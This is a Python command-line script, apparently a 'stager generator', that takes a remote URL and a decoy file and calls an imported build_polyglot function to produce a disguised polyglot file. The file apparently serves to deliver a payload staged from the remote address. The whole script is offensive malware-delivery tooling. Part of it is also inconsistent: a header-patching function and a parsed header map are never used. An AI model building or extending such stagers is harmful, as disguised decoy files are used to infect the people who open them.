import sys
import os
import json
import base64

from polyglot_builder import build_polyglot

def inject_header_if_needed(decoy_path: str, expected_header: bytes):
    with open(decoy_path, 'rb') as f:
        content = f.read()

    if content.startswith(expected_header):
        return  # header is fine

    # Patch: Replace existing header
    patched = expected_header + content[len(expected_header):]
    
    with open(decoy_path, 'wb') as f:
        f.write(patched)

def main():
    if len(sys.argv) < 7:
        print("Usage: stager_generator.py <remote_txt_url> <decoy_path> <output_folder> <output_filename> <output_format> <header_map_json>", file=sys.stderr)
        sys.exit(1)

    txt_url = sys.argv[1]
    decoy_path = sys.argv[2]
    output_folder = sys.argv[3]
    output_filename = sys.argv[4]
    output_format = sys.argv[5]
    header_map_json = base64.b64decode(sys.argv[6]).decode("utf-8")

    try:
        header_map = json.loads(header_map_json)
    except json.JSONDecodeError:
        print("Invalid header map JSON", file=sys.stderr)
        sys.exit(2)

    os.makedirs(output_folder, exist_ok=True)
    output_path = os.path.join(output_folder, output_filename)

    try:
        build_polyglot(decoy_path, txt_url, output_path)
        print(output_path)
    except Exception as e:
        print(f"Error: {str(e)}", file=sys.stderr)
        sys.exit(2)

if __name__ == "__main__":
    main()
